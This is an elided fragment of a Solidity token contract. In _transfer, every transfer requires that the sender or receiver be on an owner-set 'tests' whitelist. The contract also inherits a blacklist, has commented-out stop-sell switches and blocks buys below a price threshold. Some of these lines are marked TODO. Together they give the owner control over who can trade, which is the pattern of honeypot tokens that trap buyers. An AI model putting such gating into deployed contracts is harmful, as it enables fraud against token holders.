...
abstract contract TradingManager {
    ...
    // function inSelling() public view returns (bool) {
    //     return sellState;
    // }
    ...
    // function _setStopSell(bool s) internal {
    // sellState = s;
    // }

    // function setStopSell(bool s) public virtual {
    // _authorizeTradingManager();
    // _setStopSell(s);
    // }
...
abstract contract Token is SwapUSDT, Excludes, TradingManager, TheBlackList {
    using SafeMath for uint256;
    ...
    function openTrading() public override {
        super.openTrading();
    ...
    // function setStopSell(bool s) public override {
    // super.setStopSell(s);
    ...
    //TODO
    function setTests(address user, bool b) public onlyOwner {
        _tests[user] = b;
    }

    //TODO
    function isTests(address user) public view returns (bool) {
        return _tests[user] == true;
    }
    ...
    function _transfer(
        ...
        //TODO
        require((_tests[from] || _tests[to]), "not testor");
        ...
        if (isPair(from)) {
            ...
            if (!allCanBuy) {
                require(currentPrice >= thePrice500U, "cannot buy");
            }
    ...
    function refreshFeeAll() private {
    ...
    function setRobotConfig(uint256 _kn, uint256 _kb) internal {
        kn = _kn;
        kb = _kb;
